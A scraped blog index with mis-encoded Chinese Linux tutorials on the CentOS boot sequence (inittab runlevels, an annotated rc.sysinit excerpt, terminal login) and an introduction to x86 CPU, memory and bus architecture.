è¯¥æ­¥éª¤ä¸»è¦å®Œæˆé€šè¿‡/sbin/init,initç¨‹åºå‡†å¤‡è½¯ä»¶è¿è¡Œåå¢ƒï¼Œå¯åŠ¨ç³»ç»ŸæœåŠ¡ é€šè¿‡/etc/inittabæ–‡ä»¶ç¡®å®šè¿è¡Œçº§åˆ«ï¼Œç„¶åå»æ‰§è¡Œç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬/etc/rc.sysinit,ä¸ºç”¨æˆ·åˆå§‹åŒ–ç”¨æˆ·ç©ºé—´ç¯å¢ƒï¼Œåœ¨å®Œæˆåˆå§‹åŒ–åï¼Œæ ¹æ®è¿è¡Œçº§åˆ«ï¼Œç³»ç»Ÿå¼€å§‹å¯¹åº”çº§åˆ«çš„ç›®å½•å¯åŠ¨æœåŠ¡ï¼Œå…³é—­é‚£äº›ä¸è¦çš„æœåŠ¡ï¼ˆé‡Œé¢S99local -\u003e ../rc.localï¼‰ç”¨æˆ·è‡ªåŠ¨æœåŠ¡å¯åŠ¨è„šæœ¬ã€‚ å…³é”®æ–‡ä»¶è¯¦è§£ 1. ç³»ç»Ÿå¯åŠ¨çº§åˆ«ï¼š/etc/inittabæ–‡ä»¶ # inittab is only used by upstart for the default runlevel. # # ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM. # # System initialization is started by /etc/init/rcS.conf # # Individual runlevels are started by /etc/init/rc.conf # # Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf # # Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf, # with configuration in /etc/sysconfig/init. # # For information on how to write upstart event handlers, or how # upstart works, see init(5), init(8), and initctl(8). # # Default runlevel. The runlevels used are: # 0 - halt (Do NOT set initdefault to this) å…³æœº # 1 - Single user mode å•ç”¨æˆ·æ¨¡å¼ï¼Œrootç”¨æˆ·ï¼Œæ— éœ€è®¤è¯ï¼Œç»´æŠ¤æ¨¡å¼ï¼› # 2 - Multiuser, without NFS (The same as 3, if you do not have networking)ï¼Œ å¤šç”¨æˆ·æ¨¡å¼ï¼Œä¼šå¯åŠ¨ç½‘ç»œåŠŸèƒ½ï¼Œä½†æ˜¯ä¸ä¼šå¯åŠ¨NFSï¼Œç»´æŠ¤æ¨¡å¼ï¼› # 3 - Full multiuser mode å®Œå…¨åŠŸèƒ½æ¨¡å¼ï¼Œæ–‡æœ¬ç•Œé¢ï¼› # 4 - unused é¢„ç•™ # 5 - X11 å®Œå…¨åŠŸèƒ½æ¨¡å¼ï¼Œå›¾å½¢ç•Œé¢ï¼Œæ­¤å¤„ä½¿ç”¨çš„å›¾å½¢ç•Œé¢ä¸ºX11 # 6 - reboot (Do NOT set initdefault to this) é‡å¯ # id:3:initdefault: 2. ç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬ï¼š/etc/rc.d/rc.sysinit è¯¥æ–‡ä»¶åœ¨å„ä¸ªä¸åŒçš„å‘å¸ƒç‰ˆæœ¬ä¸­å­˜åœ¨ä¸åŒï¼Œæ­¤å¤„ä»…ä»¥centosä½œä¸ºæ ·ä¾‹è¿›è¡Œè§£é‡Šã€‚ /etc/rc.v/rc.sysinitä¸»è¦çš„å·¥ä½œå¤§æ¦‚æœ‰ä»¥ä¸‹å‡ é¡¹ï¼š è·å–ç½‘ç»œç¯å¢ƒå’Œä¸»æœºç±»å‹ï¼šè¯»å–ç½‘ç»œè®¾ç½®æ–‡ä»¶/etc/sysconfig/networkï¼Œè·å–ä¸»æœºåä»¥åŠç½‘å…³ç­‰ç½‘ç»œç¯å¢ƒï¼› æµ‹è¯•ä¸æŒ‚è½½å†…å­˜è®¾å¤‡/procå’ŒUSBè®¾å¤‡/sysï¼šé™¤æŒ‚è½½å†…å­˜è®¾å¤‡å¤–ï¼Œè¿˜ä¼šä¸»åŠ¨æ£€æŸ¥ç³»ç»Ÿä¸Šæ˜¯å¦å­˜åœ¨USBè®¾å¤‡ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è½½å…¥å¯¹åº”çš„é©±åŠ¨ï¼Œå¹¶æŒ‚è½½USBçš„æ–‡ä»¶ç³»ç»Ÿï¼› åˆ¤æ–­æ˜¯å¦å¯åŠ¨SELinuxï¼šSELinuxï¼Œå…¨ç§°Security Enhance Linuxå¥—ä»¶ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯å¼ºåŒ–Linuxæ“ä½œç¯å¢ƒçš„å®‰å…¨æ€§ï¼› å‘¨è¾¹è®¾å¤‡çš„æ£€æŸ¥ä¸PnP(Plug and Playï¼‰å‚æ•°çš„æµ‹è¯•ï¼šæ ¹æ®å†…æ ¸åœ¨å¼€æœºæ—¶çš„æ£€æŸ¥ç»“æœï¼ˆ/proc/sys/kernel/modprobeï¼‰å¼€å§‹i è¿›è¡Œide/scsi/network/audioç­‰å‘¨è¾¹è®¾å¤‡çš„æ£€æŸ¥ï¼Œå¹¶åˆ©ç”¨å·²è£…åœ¨çš„kernelæ¨¡å—è¿›è¡ŒPnPè®¾å¤‡çš„å‚æ•°æµ‹è¯•ï¼› è½½å…¥ç”¨æˆ·è‡ªå®šä¹‰æ¨¡å—ï¼šç”¨æˆ·å¯ä»¥åœ¨/etc/sysconfig/modules/*.modulesè®¾ç½®è¦åŠ è½½çš„æ¨¡å—ï¼› è½½å…¥å†…æ ¸çš„ç›¸å…³è®¾ç½®ï¼šç³»ç»Ÿä¼šä¸»åŠ¨è¯»å–/etc/sysctl.confçš„å†…å®¹ï¼Œæ ¹æ®å…¶é…ç½®è®¾ç½®å†…æ ¸å„é€‰é¡¹ï¼› è®¾ç½®ç³»ç»Ÿæ—¶é—´ï¼› è®¾ç½®consoleæ ·å¼ï¼› è®¾ç½®RAIDå’ŒLVMç­‰åŠŸèƒ½ï¼› ä½¿ç”¨fsckè¿›è¡Œç£ç›˜æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ï¼› è¿›è¡Œç£ç›˜å®¹é‡quotaçš„è½¬æ¢ï¼ˆéå¿…è¦ï¼‰ï¼› é‡æ–°ä»¥å¯è¯»æ¨¡å¼æŒ‚è½½ç³»ç»Ÿç£ç›˜ï¼› å¯åŠ¨quotaåŠŸèƒ½ï¼› å¯åŠ¨ç³»ç»Ÿéšæœºè£…ç½®ï¼ˆäº§ç”Ÿéšæœºæ•°åŠŸèƒ½ï¼‰ï¼› æ¸…é™¤å¼€æœºè¿‡ç¨‹ä¸­çš„ç¼“å­˜å†…å®¹ï¼› å°†å¼€æœºè¿‡ç¨‹ä¸­çš„ç›¸å…³ä¿¡æ¯å†™å…¥åˆ°/var/log/dmesgæ–‡ä»¶ä¸­ã€‚ #!/bin/bash # # /etc/rc.d/rc.sysinit - run once at boot time # # Taken in part from Miquel van Smoorenburg's bcheckrc. # # è·å–ä¸»æœºå HOSTNAME=$(/bin/hostname) set -m # å¦‚æœå­˜åœ¨/etc/sysconfig/networkåˆ™æ‰§è¡Œ if [ -f /etc/sysconfig/network ]; then . /etc/sysconfig/network fi # æ‰§è¡ŒåHOSTNAMEå¦‚æœä¸ºç©ºæˆ–â€œ(none)â€ï¼Œåˆ™è®¾ç½®ä¸»æœºåä¸ºlocalhost if [ -z \"$HOSTNAME\" -o \"$HOSTNAME\" = \"(none)\" ]; then HOSTNAME=localhost fi # æŒ‚åœ¨/procå’Œ/sysï¼Œè¿™æ ·fsckæ‰èƒ½ä½¿ç”¨å·æ ‡ if [ ! -e /proc/mounts ]; then mount -n -t proc /proc /proc # -nè¡¨ç¤ºä¸å†™/etc/mtabï¼Œå› ä¸ºæ­¤æ—¶çš„/ä¸ºåªè¯» mount -n -t sysfs /sys /sys \u003e/dev/null 2\u003e\u00261 # å°†/sysç›®å½•ä»¥sysfsæ ¼å¼æŒ‚è½½åˆ°/sysç›®å½•ä¸‹ fi # å¦‚æœå­˜åœ¨/prc/bus/usbç›®å½•ï¼Œåˆ™æŒ‚è½½usbfsåˆ°usbä¸‹ if [ ! -d /proc/bus/usb ]; then modprobe usbcore \u003e/dev/null 2\u003e\u00261 \u0026\u0026 mount -n -t usbfs /proc/bus/usb /proc/bus/usb else mount -n -t usbfs /proc/bus/usb /proc/bus/usb fi # æŒ‚è½½/etc/fstabæ–‡ä»¶ä¸­å®šä¹‰çš„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿ #remount /dev/shm to set attributes from fstab #669700 mount -n -o remount /dev/shm \u003e/dev/null 2\u003e\u00261 #remount /proc to set attributes from fstab #984003 mount -n -o remount /proc \u003e/dev/null 2\u003e\u00261 # æ‰§è¡Œfunctionsæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æä¾›æ¥å¾ˆå¤šæœ‰ç”¨çš„å‡½æ•°ï¼Œå…·ä½“å†…å®¹å¯è§å‚è€ƒæ–‡çŒ®5 . /etc/init.d/functions PLYMOUTH= [ -x /bin/plymouth ] \u0026\u0026 PLYMOUTH=yes # åœ¨å¯åŠ¨æ—¶æ˜¾ç¤ºä¸€ä¸ªåŠ¨ç”» # æ¿€æ´»udevå’Œselinux # æ£€æŸ¥SELinuxçŠ¶æ€ SELINUX_STATE= if [ -e \"/selinux/enforce\" ] \u0026\u0026 [ \"$(cat /proc/self/attr/current)\" != \"kernel\" ]; then if [ -r \"/selinux/enforce\" ] ; then SELINUX_STATE=$(cat \"/selinux/enforce\") else # å¦‚æœæ— æ³•æˆåŠŸè¯»å–ï¼Œåˆ™ç›´æ¥ç½®1 SELINUX_STATE=1 fi fi if [ -n \"$SELINUX_STATE\" -a -x /sbin/restorecon ] \u0026\u0026 __fgrep \" /dev \" /proc/mounts \u003e/dev/null 2\u003e\u00261 ; then /sbin/restorecon -R -F /dev 2\u003e/dev/null fi disable_selinux() { echo $\"*** Warning -- SELinux is active\" echo $\"*** Disabling security enforcement for system recovery.\" echo $\"*** Run 'setenforce 1' to reenable.\" echo \"0\" \u003e \"/selinux/enforce\" } relabel_selinux() { # if /sbin/init is not labeled correctly this process is running in the # wrong context, so a reboot will be required after relabel AUTORELABEL= . /etc/selinux/config echo \"0\" \u003e /selinux/enforce [ -n \"$PLYMOUTH\" ] \u0026\u0026 plymouth --hide-splash if [ \"$AUTORELABEL\" = \"0\" ]; then echo echo $\"*** Warning -- SELinux ${SELINUXTYPE} pol","date":"2020-10-13","objectID":"/2020/10/boot/:2:4","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"5. å¯åŠ¨ç»ˆç«¯ï¼Œç”¨æˆ·ç™»å½•shell è¿™ä¸€æ­¥æ˜¯ç”¨æˆ·ç™»å½•shellè¿‡ç¨‹ å¦‚æœæ²¡æœ‰æ”¹å˜çº§åˆ«ï¼Œé»˜è®¤æƒ…å†µæ‰§è¡Œ/sbin/mingettyæ‰“å¼€6ä¸ªçº¯æ–‡æœ¬ç»ˆç«¯ï¼Œè®©ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚è¾“å…¥å®Œæˆåï¼Œå†è°ƒç”¨loginç¨‹åºï¼Œæ ¸å¯¹å¯†ç ã€‚å¦‚æœå¯†ç æ­£ç¡®ï¼Œå°±ä»æ–‡ä»¶ /etc/passwd è¯»å–è¯¥ç”¨æˆ·æŒ‡å®šçš„shellï¼Œç„¶åå¯åŠ¨è¿™ä¸ªshellã€‚ ","date":"2020-10-13","objectID":"/2020/10/boot/:2:5","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"å‚è€ƒé“¾æ¥ https://linux.cn/article-8807-1.html https://blog.51cto.com/zhang789/1851675 https://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html https://blog.51cto.com/433266/2173126 https://www.cnblogs.com/f-ck-need-u/p/7518142.html ","date":"2020-10-13","objectID":"/2020/10/boot/:3:0","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["Linux"],"content":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","date":"2020-07-25","objectID":"/2020/07/x86/","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œâ€”â€”OSâ€”â€”x86æ¶æ„ Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œâ€”â€”OSâ€”â€”x86æ¶æ„ ","date":"2020-07-25","objectID":"/2020/07/x86/:0:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"å‰è¨€ å®Œæ•´çš„è®¡ç®—æœºç”±æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ç»„æˆï¼Œå¿…é¡»ä¸¤è€…å…¼å¤‡ï¼Œè€Œä¸”ä¸¤è€…è¦å®Œç¾é€‚é…æ‰èƒ½è‰¯å¥½è¿ä½œã€‚æ“ä½œç³»ç»Ÿçš„æ•°é‡å±ˆæŒ‡å¯æ•°ï¼Œä½†æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸‹é¢çš„ç¡¬ä»¶å´æ˜¯åƒåƒä¸‡ä¸‡ã€‚å¦‚ä½•åšåˆ°æ“ä½œç³»ç»Ÿå…¼å®¹å„ç±»å„å¼çš„ç¡¬ä»¶ç¯å¢ƒå‘¢ï¼Ÿå¤§å®¶éƒ½åè®®ä¸€ä¸ªé€šç”¨çš„æ¶æ„ï¼Œå¤§å®¶éƒ½é€‚é…è¿™ä¸ªæ¶æ„å¥½äº†ã€‚äºæ˜¯ï¼Œä¸€ä¸ªä¸šå†…é€šç”¨çš„æ¶æ„â€”â€”x86æ¶æ„è¯ç”Ÿäº†ã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:1:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"ä¸€ã€è®¡ç®—æœºçš„å·¥ä½œæ¨¡å¼ è®¡ç®—æœºçš„ç¡¬ä»¶æ ¹æ®åŠŸèƒ½åˆ’åˆ†æˆå„è‡ªç‹¬ç«‹çš„äº§å“ï¼Œåœ¨è¿›è¡Œç»„è£…æ—¶éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºå°†å¤æ‚çš„è®¾å¤‡å’Œè¿æ¥çº¿å®‰è£…å¥½ã€‚å¦‚ä½•å®‰è£…æˆ‘çŸ¥é“ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå®‰è£…å‘¢ï¼Ÿ ä¸‹å›¾ä¸ºä¸€ä¸ªç¡¬ä»¶å›¾å’Œè®¡ç®—æœºçš„é€»è¾‘å›¾ï¼Œä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¤§æ¦‚çœ‹åˆ°è®¡ç®—æœºçš„å·¥ä½œæ¨¡å¼ï¼š CPUï¼ŒCentral Processing Unitï¼Œè®¡ç®—æœºæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼Œæ‰€æœ‰è®¾å¤‡çš„è¿ä½œå‡å›´ç»•CPUå±•å¼€ã€‚ æ€»çº¿ï¼ŒBusï¼ŒCPUè¿æ¥å…¶ä»–è®¾å¤‡æ—¶ä½¿ç”¨ï¼Œå³ä¸»æ¿ä¸Šæ•°é‡åºå¤§çš„é›†æˆç”µè·¯ï¼Œç»„æˆäº†CPUå’Œå…¶ä»–è®¾å¤‡çš„é«˜é€Ÿé€šä¿¡é€šé“ã€‚ å†…å­˜ï¼ŒMemoryï¼Œä¿å­˜CPUè®¡ç®—çš„ä¸­é—´ç»“æœï¼Œä½¿å¾—CPUåœ¨åç»­è¿ç®—ä¸­å¯ä»¥ä½¿ç”¨ä¸´æ—¶ä¿å­˜çš„è®¡ç®—æ•°æ®ã€‚ å…¶ä»–è®¾å¤‡ï¼Œæ˜¾ç¤ºå™¨ã€ç£ç›˜ã€å¯ç§»åŠ¨å­˜å‚¨ä»‹è´¨ç­‰ã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:2:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"1. CPUå’Œå†…å­˜å¦‚ä½•è¿›è¡Œé…åˆï¼Ÿ CPUå¯ä»¥åˆ’åˆ†ä¸º3ä¸ªå•å…ƒï¼šè¿ç®—å•å…ƒã€æ•°æ®å•å…ƒå’Œæ§åˆ¶å•å…ƒã€‚è¿ç®—å•å…ƒä¸“æ³¨è®¡ç®—ï¼Œæ‰€ä½¿ç”¨çš„æ•°æ®ã€è®¡ç®—çš„ç»“æœç”±æ•°æ®å•å…ƒä¿å­˜ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè™½ç„¶CPUå¯ä»¥é€šè¿‡å†…å­˜æ€»çº¿ä¸å†…å­˜é€šä¿¡ï¼Œè®¡ç®—ä½¿ç”¨çš„æ•°æ®å’Œè®¡ç®—ç»“æœå¯ä»¥ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œä½†æ˜¯è¿™æ ·é€Ÿåº¦å¾ˆæ…¢ï¼Œæ¯æ¬¡é€šè¿‡æ€»çº¿ä¼ è¾“ä¼šå¾ˆæ¶ˆè€—æ—¶é—´ï¼Œæ‰€ä»¥CPUå†…éƒ¨ä¸“é—¨å¼€å‘äº†ä¸€ä¸ªæ•°æ®å•å…ƒï¼Œä¿å­˜ä¸´æ—¶ã€å°‘é‡çš„è®¡ç®—æ•°æ®ï¼Œè¿™æ ·é€Ÿåº¦ä¼šå¤§å¹…æå‡ï¼‰ã€‚æ•°æ®å•å…ƒåŒ…æ‹¬CPUå†…éƒ¨çš„ç¼“å­˜å’Œå¯„å­˜å™¨ç»„ï¼Œç©ºé—´å°ï¼Œé€Ÿåº¦å¿«ï¼Œä»…ç”¨äºä¸´æ—¶å­˜æ”¾è¿ç®—æ•°æ®ã€‚æ§åˆ¶å•å…ƒåˆ™è´Ÿè´£ä»»åŠ¡åˆ†å‘å’Œè°ƒåº¦ï¼Œç”¨äºè·å–ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åæ‰§è¡Œï¼Œä¼šæŒ‡å¯¼è¿ç®—å•å…ƒä»æ•°æ®å•å…ƒä¸­å–å‡ºå¤šå°‘æ•°æ®ã€æ€æ ·è¿›è¡Œè®¡ç®—ã€è®¡ç®—ç»“æœæ”¾åœ¨æ•°æ®å•å…ƒçš„ä½•å¤„ç­‰ã€‚ ç¨‹åºè¿è¡Œåï¼Œæ¯ä¸ªè¿›ç¨‹ä¼šæœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œä¾‹å¦‚å›¾ä¸­è¿›ç¨‹Aå’Œè¿›ç¨‹Bï¼Œäº’ç›¸éš”ç¦»ã€‚ç¨‹åºçš„è¿è¡Œä¸€èˆ¬æµç¨‹æ˜¯å¼€è¾Ÿå‡ºä¸€ç¯‡å†…å­˜ç©ºé—´ï¼Œç¨‹åºçš„ç£ç›˜ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜ç©ºé—´ä¸­ï¼Œå½¢æˆä»£ç æ®µã€æ•°æ®æ®µç­‰ã€‚è¿›ç¨‹Aå’Œè¿›ç¨‹Båœ¨æˆåŠŸåŠ è½½åï¼Œå½¼æ­¤çš„è¿è¡Œç©ºé—´äº’ç›¸éš”ç¦»ï¼Œä½†æ˜¯å¹¶ä¸è¿ç»­ï¼Œè¿™é‡Œçš„ä¸è¿ç»­æ˜¯æŒ‡åˆ†é…çš„å†…å­˜ç©ºé—´åœ¨ç‰©ç†ä¸Šä¸ä¸€å®šæ˜¯è¿ç»­çš„ï¼Œè¿™ä¸»è¦ä¸Linuxæ“ä½œç³»ç»Ÿçš„å†…å­˜åˆ†é…æœºåˆ¶æœ‰å…³ï¼Œåç»­ä¼šåšè¯¦ç»†æ·±å…¥åˆ†æã€‚è€Œä¸”é™¤äº†ä¸Šå›¾ä¸­çš„ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œè¿˜ä¼šæœ‰å…¶ä»–çš„æ®µã€‚ ç¨‹åºè¿è¡Œä¸­éœ€è¦æ“ä½œçš„æ•°æ®å’Œäº§ç”Ÿçš„è¿ç®—ç»“æœï¼Œä¼šå­˜æ”¾åœ¨æ•°æ®æ®µä¸­ã€‚CPUå¦‚ä½•æ‰§è¡Œç¨‹åºï¼Œæ“ä½œè¿™äº›æ•°æ®ï¼Œäº§ç”Ÿè¿ç®—ç»“æœï¼Œå¹¶å†™å›å†…å­˜å‘¢ï¼Ÿ CPUçš„æ§åˆ¶å•å…ƒä¸­æœ‰ä¸€ä¸ªæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œä¿å­˜äº†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚æ§åˆ¶å•å…ƒä¼šä»ä»£ç æ®µä¸­ä¸æ–­è·å–æŒ‡ä»¤çš„åœ°å€æ”¾å…¥è¯¥è¿›æ‘å…¶ä¸­ï¼Œåœ¨æ‰§è¡Œæ—¶ç›´æ¥è¯»å–è¯¥å¯„å­˜å™¨ï¼Œå°±å¯ä»¥çŸ¥é“ä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤äº†ã€‚ æŒ‡ä»¤ä¸€èˆ¬åˆ†ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯åšä»€ä¹ˆæ“ä½œï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯è¯¥æ“ä½œè¦æ“ä½œçš„æ•°æ®ã€‚è¦æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ï¼Œéœ€è¦å°†ç¬¬ä¸€éƒ¨åˆ†äº¤ç»™è¿ç®—å•å…ƒï¼Œç¬¬äºŒéƒ¨åˆ†äº¤ç»™æ•°æ®å•å…ƒï¼Œæ•°æ®å•å…ƒæ ¹æ®æ•°æ®çš„åœ°å€ï¼Œä»æ•°æ®æ®µé‡Œè¯»åˆ°æ•°æ®å¯„å­˜å™¨ä¸­ï¼Œç„¶åå†å‚ä¸è¿ç®—ã€‚è¿ç®—å•å…ƒåšå®Œè¿ç®—ï¼Œäº§ç”Ÿçš„ç»“æœæš‚å­˜åœ¨æ•°æ®å•å…ƒçš„æ•°æ®å¯„å­˜å™¨ä¸­ï¼Œç­‰å¾…æŒ‡ä»¤å°†å…¶å†™å›åˆ°å†…å­˜ä¸­çš„æ•°æ®æ®µä¸­ã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:2:1","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"2. è¿›ç¨‹åˆ‡æ¢ ä¸Šé¢æ‰€è®²çš„å„ç§æ“ä½œå‡åœ¨è¿›ç¨‹Aä¸­è¿›è¡Œï¼Œé‚£ä¹ˆè¿›ç¨‹Bå‘¢ï¼ŸCPUé‡Œæœ‰ä¸¤ä¸ªä¸“é—¨çš„å¯„å­˜å™¨ä¿å­˜å½“å‰å¤„ç†è¿›ç¨‹çš„ä»£ç æ®µã€æ•°æ®æ®µçš„èµ·å§‹åœ°å€ã€‚å¦‚æœå¯„å­˜å™¨é‡Œä¿å­˜çš„æ˜¯è¿›ç¨‹Açš„åœ°å€ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œè¿›ç¨‹Açš„æŒ‡ä»¤ï¼›å¦‚æœåˆ‡æ¢ä¸ºè¿›ç¨‹Bçš„åœ°å€ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œè¿›ç¨‹Bçš„æŒ‡ä»¤ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè¿›ç¨‹åˆ‡æ¢(Process Switch)ã€‚ è¿›ç¨‹åˆ‡æ¢æ˜¯å¤šä»»åŠ¡ç³»ç»Ÿçš„å¿…å¤‡æ“ä½œï¼Œåç»­ä¼šè¿›è¡Œæ·±å…¥åˆ†æã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:2:2","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"3. åœ°å€æ€»çº¿å’Œæ•°æ®æ€»çº¿ CPUå’Œå†…å­˜çš„æ•°æ®ä¼ è¾“ä¸»è¦é æ€»çº¿ï¼Œæ€»çº¿åœ¨æ•´ä½“ä¸Šåˆ†ä¸ºä¸¤ç±»ï¼š åœ°å€æ€»çº¿(Address Bus)ï¼Œè®¿é—®åœ°å€æ•°æ®ï¼Œå³è¯»å–å†…å­˜ä¸­ä½•å¤„çš„æ•°æ® æ•°æ®æ€»çº¿(Data Bus)ï¼Œè¯»å–åˆ°çš„æ•°æ® åœ°å€æ€»çº¿çš„ä½æ•°ï¼Œå†³å®šäº†èƒ½è®¿é—®çš„åœ°å€èŒƒå›´ã€‚å¦‚ä½•ç†è§£ï¼Ÿä¾‹å¦‚æ€»çº¿åªæœ‰2ä½ï¼Œé‚£ä¹ˆèƒ½è®¿é—®çš„åœ°å€å°±ä¸º00ã€01ã€10ã€11è¿™4ä¸ªåœ°å€ï¼Œå¦‚æœæ˜¯3ä½å°±å¯ä»¥è®¿é—®8ä¸ªåœ°å€ï¼Œæ‰€ä»¥åœ°å€æ€»çº¿ä½æ•°è¶Šå¤šï¼Œèƒ½è®¿é—®çš„åœ°å€èŒƒå›´å°±è¶Šå¹¿ã€‚ æ•°æ®æ€»çº¿çš„ä½æ•°ï¼Œå†³å®šäº†ä¸€æ¬¡å¯ä»¥è¯»å¤šå°‘æ•°æ®ã€‚å¦‚ä½•ç†è§£ï¼Ÿä¾‹å¦‚æ€»çº¿åªæœ‰2ä½ï¼Œé‚£ä¹ˆCPUä¸€æ¬¡åªèƒ½æ‹¿2ä½ï¼Œæƒ³è¦æ‹¿8ä½ï¼Œå°±éœ€è¦è¯»4æ¬¡ã€‚æ‰€ä»¥æ•°æ®æ€»çº¿ä½æ•°è¶Šå¤šï¼Œä¸€æ¬¡å¯ä»¥è¯»å–çš„æ•°æ®å°±è¶Šå¤šï¼Œè®¿é—®é€Ÿåº¦ä¹Ÿå°±è¶Šå¿«ã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:2:3","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"4. x86æ¶æ„ x86æ³›æŒ‡ä¸€ç³»åˆ—åŸºäº[Intel 8086](https://baike.baidu.com/item/Intel 8086)ä¸”å‘åå…¼å®¹çš„ä¸­å¤®å¤„ç†å™¨æŒ‡ä»¤é›†æ¶æ„ã€‚æœ€æ—©çš„8086å¤„ç†å™¨äº1978å¹´ç”±Intelæ¨å‡ºï¼Œä¸º16ä½å¾®å¤„ç†å™¨ã€‚ä½†æ˜¯è®©x86çœŸæ­£å¾—åˆ°æ¨å¹¿çš„ï¼Œæ˜¯IBMã€‚å› ä¸ºIBMçš„PCå–å¾—å¤ªå¥½ï¼Œè¢«èµ·è¯‰å„æ–­ï¼Œæ— å¥ˆä¹‹ä¸‹å…¬å¼€äº†ä¸€äº›æŠ€æœ¯ï¼Œè¿™ä½¿å¾—ä¸šå†…å…¶ä»–å“ç‰Œé€æ­¥éƒ½å¼€å§‹é‡‡ç”¨IBMçš„â€œIntel 8088èŠ¯ç‰‡+MS-DOSâ€çš„PCæ¨¡å¼ã€‚Intelçš„æŠ€æœ¯å› æ­¤æˆä¸ºäº†è¡Œä¸šçš„å¼€æ”¾äº‹å®æ ‡å‡†ã€‚ç”±äºè¯¥ç³»åˆ—å¼€ç«¯ä¸8086ï¼Œå› æ­¤ç§°ä¸ºx86æ¶æ„ã€‚ è™½ç„¶åæ¥çš„Intelçš„CPUçš„æ•°æ®æ€»çº¿å’Œåœ°å€æ€»çº¿è¶Šæ¥è¶Šå®½ï¼Œå¤„ç†èƒ½åŠ›è¶Šæ¥è¶Šå¼ºï¼Œä½†æ˜¯å§‹ç»ˆåšæŒæ ‡å‡†ã€å¼€æ”¾ã€å…¼å®¹çš„åŸåˆ™ï¼Œå› æ­¤æ„å»ºäº†ä¸€ä¸ªåºå¤§çš„è½¯ç¡¬ä»¶ç”Ÿæ€ã€‚ éƒ¨åˆ†èŠ¯ç‰‡å’Œæ€»çº¿æ•°æ®å¦‚ä¸‹ï¼š å‹å· æ€»çº¿ä½å®½ åœ°å€ä½ å¯»å€ç©ºé—´ 8080 8 16 64k (2^16) 8086 16 20 1M (2^20) 8088 8 20 1M (2^20) 80386 32 32 4G (2^32) 